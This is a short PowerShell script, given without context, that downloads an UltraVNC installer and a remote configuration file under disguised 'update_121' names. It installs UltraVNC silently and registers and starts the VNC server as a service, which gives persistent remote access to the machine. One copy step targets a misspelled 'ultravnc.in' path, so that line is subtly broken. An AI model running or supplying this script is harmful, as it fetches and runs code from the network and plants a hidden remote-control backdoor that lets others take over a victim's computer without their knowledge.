cd $Env:USERPROFILE -ErrorAction Stop
Start-Sleep -Seconds 1 -ErrorAction Stop
$client = new-object System.Net.WebClient -ErrorAction Stop
Start-Sleep -Seconds 1 -ErrorAction Stop
$client.DownloadFile("https://www.uvnc.eu/download/1224/UltraVNC_1_2_24_X64_Setup.exe","$Env:USERPROFILE\update_121.exe") ;
$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
& $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
Start-Sleep -Seconds 1 -ErrorAction Stop
& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
